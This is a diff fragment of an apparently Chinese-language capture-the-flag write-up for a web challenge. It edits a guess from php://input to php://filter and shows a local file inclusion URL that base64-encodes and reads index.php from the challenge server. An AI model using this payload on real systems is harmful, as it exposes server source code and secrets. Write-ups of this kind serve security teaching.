@@ -12,7 +12,7 @@ xman_web_ics05
 
 `http://111.198.29.45:39337/index.php/login?page=index`
 
-于是猜测可以php://input
+于是猜测可以php://filter
 
 > http://111.198.29.45:39337/index.php/login?page=php://filter/read=convert.base64-encode/resource=index.php
 
